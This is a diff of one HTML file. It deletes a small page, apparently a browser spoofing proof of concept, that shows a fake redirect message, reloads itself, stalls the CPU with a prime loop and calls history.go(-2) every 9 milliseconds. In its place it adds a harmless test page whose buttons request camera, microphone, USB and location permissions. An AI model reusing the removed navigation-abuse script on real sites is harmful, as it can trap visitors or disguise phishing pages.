@@ -1,42 +1,108 @@
-<script>
-    //// MDN calculatePrimes slowdown code
-    function calculatePrimes(iterations, multiplier) {
-        var primes = [];
-        for (var i = 0; i < iterations; i++) {
-            var candidate = i * (multiplier * Math.random());
-            var isPrime = true;
-            for (var c = 2; c <= Math.sqrt(candidate); ++c) {
-                if (candidate % c === 0) {
-                    // not prime
-                    isPrime = false;
-                    break;
-                }
-            }
-            if (isPrime) {
-                primes.push(candidate);
-            }
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Permission Trigger Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding-top: 20px; /* পপ-আপের কাছাকাছি রাখার জন্য */
         }
-        return primes;
-    }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+            transition: background 0.3s;
+        }
+        .cam-btn { background-color: #e74c3c; color: white; }
+        .mic-btn { background-color: #3498db; color: white; }
+        .usb-btn { background-color: #2ecc71; color: white; }
+        .loc-btn { background-color: #f1c40f; color: black; }
+        button:hover { opacity: 0.8; }
+        #status { margin-top: 20px; color: #555; font-size: 13px; }
+    </style>
+</head>
+<body>
 
+<div class="container">
+    <h3>Browser Permission Test</h3>
+    <p>নিচের বাটনগুলো ক্লিক করলে ব্রাউজারের উপরে পপ-আপ আসবে:</p>
+    
+    <button class="cam-btn" onclick="getCamera()">Camera Permission</button>
+    <button class="mic-btn" onclick="getMic()">Microphone Permission</button>
+    <button class="usb-btn" onclick="getUSB()">USB Device Permission</button>
+    <button class="loc-btn" onclick="getLocation()">Location Permission</button>
 
-    function main() {
-        location.reload()
-        calculatePrimes(1000, 100000)
-        window.queueMicrotask(spoof)
-    }
-
-    function spoof() {
-        document.getElementById("image").src = null
-
-        setInterval(function () {
-            window.history.go(-2)
-        }, 9)
-    }
-</script>
-Please wait while we redirecting you...
-<img id="image" src="" style="font-family: 'Roboto'; opacity: 0%">
+    <div id="status">Status: Waiting for action...</div>
+</div>
 
 <script>
-    main()
+    const statusDiv = document.getElementById('status');
+
+    // ক্যামেরা পারমিশন
+    async function getCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            statusDiv.innerText = "Status: Camera Access Granted";
+            stream.getTracks().forEach(track => track.stop()); // কাজ শেষ হলে ক্যামেরা বন্ধ করা
+        } catch (err) {
+            statusDiv.innerText = "Status: Camera Error - " + err.message;
+        }
+    }
+
+    // মাইক্রোফোন পারমিশন
+    async function getMic() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            statusDiv.innerText = "Status: Microphone Access Granted";
+            stream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+            statusDiv.innerText = "Status: Mic Error - " + err.message;
+        }
+    }
+
+    // USB ডিভাইস পারমিশন (WebUSB API)
+    async function getUSB() {
+        try {
+            const device = await navigator.usb.requestDevice({ filters: [] });
+            statusDiv.innerText = "Status: USB Device Selected - " + device.productName;
+        } catch (err) {
+            statusDiv.innerText = "Status: USB Error - " + err.message;
+        }
+    }
+
+    // লোকেশন পারমিশন
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => statusDiv.innerText = "Status: Location Access Granted",
+                (err) => statusDiv.innerText = "Status: Location Error - " + err.message
+            );
+        } else {
+            statusDiv.innerText = "Status: Geolocation not supported";
+        }
+    }
 </script>
+
+</body>
+</html>
